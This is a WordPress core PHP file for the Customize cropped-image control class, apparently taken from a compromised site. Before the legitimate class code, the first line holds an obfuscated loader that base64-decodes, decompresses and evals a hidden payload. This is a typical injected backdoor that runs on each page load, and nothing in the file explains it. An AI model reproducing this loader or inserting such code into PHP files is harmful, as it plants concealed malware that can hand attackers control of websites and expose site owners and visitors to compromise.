<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Customize API: WP_Customize_Cropped_Image_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.4.0
 */

/**
 * Customize Cropped Image Control class.
 *
 * @since 4.3.0
 *
 * @see WP_Customize_Image_Control
 */
class WP_Customize_Cropped_Image_Control extends WP_Customize_Image_Control {

	/**
	 * Control type.
	 *
	 * @since 4.3.0
	 * @var string
	 */
	public $type = 'cropped_image';

	/**
	 * Suggested width for cropped image.
	 *
	 * @since 4.3.0
	 * @var int
	 */
	public $width = 150;

	/**
	 * Suggested height for cropped image.
	 *
	 * @since 4.3.0
	 * @var int
	 */
	public $height = 150;

	/**
	 * Whether the width is flexible.
	 *
	 * @since 4.3.0
	 * @var bool
	 */
	public $flex_width = false;

	/**
	 * Whether the height is flexible.
	 *
	 * @since 4.3.0
	 * @var bool
	 */
	public $flex_height = false;

	/**
	 * Enqueue control related scripts/styles.
	 *
	 * @since 4.3.0
	 */
	public function enqueue() {
		wp_enqueue_script( 'customize-views' );

		parent::enqueue();
	}

	/**
	 * Refresh the parameters passed to the JavaScript via JSON.
	 *
	 * @since 4.3.0
	 *
	 * @see WP_Customize_Control::to_json()
	 */
	public function to_json() {
		parent::to_json();

		$this->json['width']       = absint( $this->width );
		$this->json['height']      = absint( $this->height );
		$this->json['flex_width']  = absint( $this->flex_width );
		$this->json['flex_height'] = absint( $this->flex_height );
	}

}
